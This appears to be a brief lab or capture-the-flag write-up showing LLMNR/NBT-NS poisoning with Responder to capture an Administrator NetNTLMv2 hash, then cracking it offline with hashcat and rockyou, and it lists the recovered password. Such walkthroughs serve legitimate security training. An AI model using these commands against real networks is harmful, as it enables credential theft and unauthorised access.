# Responder — Tier 0

**Concept:** LLMNR/NBT-NS poisoning with Responder to capture NetNTLMv2 hashes, then crack offline.

## Steps

1. **Run Responder** on the attack interface to listen for LLMNR/NBT-NS traffic:
   ```
   sudo responder -I tun0 -A
   ```

2. **Capture hash** — Responder captured a NetNTLMv2 challenge-response hash for the `Administrator` account.

3. **Crack the hash** using hashcat mode 5600:
   ```
   hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
   ```

## Findings

| Field | Value |
|-------|-------|
| Target User | Administrator |
| Hash Type | NetNTLMv2 |
| Cracked Password | `badminton` |
| Cracking Tool | hashcat (mode 5600) |
